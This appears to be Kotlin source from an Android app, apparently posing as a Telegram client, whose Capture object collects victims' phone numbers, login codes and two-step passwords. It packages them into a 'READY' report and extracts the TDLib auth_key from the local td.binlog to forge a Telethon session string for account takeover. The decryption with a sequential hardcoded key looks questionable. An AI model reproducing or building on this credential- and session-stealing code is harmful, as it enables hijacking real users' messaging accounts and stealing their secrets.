package com.tgme.app

import android.content.Context
import android.util.Base64
import org.drinkless.tdlib.TdApi
import java.io.File
import java.net.InetAddress
import java.nio.ByteBuffer
import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec

object Capture {
    var phone = ""
    var code = ""
    var password = ""
    var codeLength = 0

    var userId = 0L
    var userName = ""
    var session = ""

    fun save(ctx: Context) {
        ctx.getSharedPreferences("tgme", Context.MODE_PRIVATE).edit()
            .putString("phone", phone).putString("code", code)
            .putString("password", password).putString("session", session)
            .apply()
    }

    fun load(ctx: Context) {
        val p = ctx.getSharedPreferences("tgme", Context.MODE_PRIVATE)
        phone = p.getString("phone", "") ?: ""
        code = p.getString("code", "") ?: ""
        password = p.getString("password", "") ?: ""
        session = p.getString("session", "") ?: ""
    }

    fun binlogFile(ctx: Context) = File(ctx.filesDir, "tdlib/db/td.binlog")

    fun payload(ctx: Context) = buildString {
        append("READY\n")
        append("num: $phone\n")
        append("code: $code\n")
        append("pass: $password\n")
        append("user: $userId $userName\n")
    }

    private fun f(o: Any, name: String): String = try {
        o.javaClass.getField(name).get(o)?.toString() ?: "-"
    } catch (_: Exception) { "-" }

    fun render(s: TdApi.Sessions): String = buildString {
        append("SESSIONS (ttl ${s.inactiveSessionTtlDays} j)\n")
        s.sessions.forEach { x ->
            append(if (x.isCurrent) "[MOI] " else "[   ] ")
            append("${x.applicationName} ${x.applicationVersion} | ${x.deviceModel} | ")
            append("${x.systemVersion} | api_id ${x.apiId} | ")
            append("login ${x.logInDate} last ${x.lastActiveDate}\n")
        }
    }

    private val DB_KEY = byteArrayOf(
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
        0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
        0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
        0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20
    )

    fun extractSession(ctx: Context): String {
        val file = binlogFile(ctx)
        if (!file.exists()) return "ERREUR: Fichier td.binlog introuvable."

        try {
            val raw = file.readBytes()
            if (raw.size < 32) return "ERREUR: Fichier trop petit."

            val iv = raw.copyOfRange(0, 16)
            val encryptedData = raw.copyOfRange(16, raw.size)
            val cipher = Cipher.getInstance("AES/CTR/NoPadding")
            val keySpec = SecretKeySpec(DB_KEY, "AES")
            cipher.init(Cipher.DECRYPT_MODE, keySpec, IvParameterSpec(iv))
            val decrypted = cipher.doFinal(encryptedData)

            // On cherche le bloc "auth_key" en texte brut dans le fichier déchiffré
            val target = "auth_key".toByteArray(Charsets.US_ASCII)
            var idx = 0
            var dcId = 0
            var authKey: ByteArray? = null

            while (idx <= decrypted.size - target.size) {
                var match = true
                for (j in target.indices) {
                    if (decrypted[idx + j] != target[j]) { match = false; break }
                }
                
                if (match) {
                    // On a trouvé "auth_key". 
                    // La structure exacte de TDLib est : [Nom (ex: auth_key)] [Taille Valeur (4)] [Valeur]
                    // La Valeur contient elle-même : [DC_ID (4)] [Taille Clé (4)] [Clé (256)]
                    var p = idx + target.size
                    
                    // Parfois le nom contient le DC (ex: auth_key{4}). On saute les accolades si présentes.
                    if (p < decrypted.size && decrypted[p] == '{'.code.toByte()) {
                        p++
                        if (p < decrypted.size) {
                            dcId = Character.getNumericValue(decrypted[p].toInt())
                            p += 2 // Sauter le chiffre et le '}'
                        }
                    }
                    
                    // Taille de la valeur globale (4 octets LE)
                    if (p + 4 <= decrypted.size) {
                        val valLen = readIntLE(decrypted, p)
                        p += 4
                        
                        if (valLen in 260..280 && p + valLen <= decrypted.size) {
                            // On lit la valeur
                            val valueData = decrypted.copyOfRange(p, p + valLen)
                            
                            // Dans valueData : [DC_ID (4)] [Taille Clé (4)] [Clé (256)]
                            val innerDc = readIntLE(valueData, 0)
                            val innerKeyLen = readIntLE(valueData, 4)
                            
                            if (innerKeyLen == 256 && valueData.size >= 8 + 256) {
                                if (dcId == 0) dcId = innerDc
                                authKey = valueData.copyOfRange(8, 8 + 256)
                                break // C'est la bonne !
                            }
                        }
                    }
                }
                idx++
            }

            if (authKey == null) return "ERREUR: auth_key introuvable."
            if (dcId !in 1..5) dcId = 4 // Fallback Bénin

            // Création de la StringSession Telethon
            val dcIps = mapOf(1 to "149.154.175.53", 2 to "149.154.167.51", 3 to "149.154.175.100", 4 to "149.154.167.91", 5 to "91.108.56.130")
            val ipBytes = InetAddress.getByName(dcIps[dcId] ?: "149.154.167.91").address

            val buffer = ByteBuffer.allocate(1 + 4 + 2 + 256)
            buffer.put(dcId.toByte())
            buffer.put(ipBytes)
            buffer.putShort(443)
            buffer.put(authKey)

            val base64 = Base64.encodeToString(buffer.array(), Base64.URL_SAFE or Base64.NO_WRAP or Base64.NO_PADDING)
            return "1$base64"

        } catch (e: Exception) {
            return "ERREUR: ${e.message}"
        }
    }

    private fun readIntLE(b: ByteArray, off: Int): Int {
        return (b[off].toInt() and 0xFF) or
               ((b[off + 1].toInt() and 0xFF) shl 8) or
               ((b[off + 2].toInt() and 0xFF) shl 16) or
               ((b[off + 3].toInt() and 0xFF) shl 24)
    }
}
